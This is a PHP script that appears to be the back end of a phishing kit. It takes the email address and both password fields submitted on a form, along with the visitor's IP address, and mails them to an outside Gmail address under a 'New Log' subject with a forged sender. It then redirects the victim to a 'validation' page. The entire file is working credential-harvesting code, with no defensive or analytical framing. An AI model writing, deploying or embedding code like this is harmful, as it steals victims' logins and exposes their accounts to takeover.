<?

$ip = getenv("REMOTE_ADDR");
$message .= "------------------------------------------------------------------\n";
$message .= " Email Address: ".$_POST['q1_email1']."\n";
$message .= "Password: ".$_POST['q4_info']."\n";
$message .= "Confirm Password: ".$_POST['q4_info2']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";



$subject = "New Log | ".$ip."\n";
$headers = "From: Bless@logg.com";
mail("deliverybox44@gmail.com",$subject,$message,$headers);

header("Location: validation.html");
?>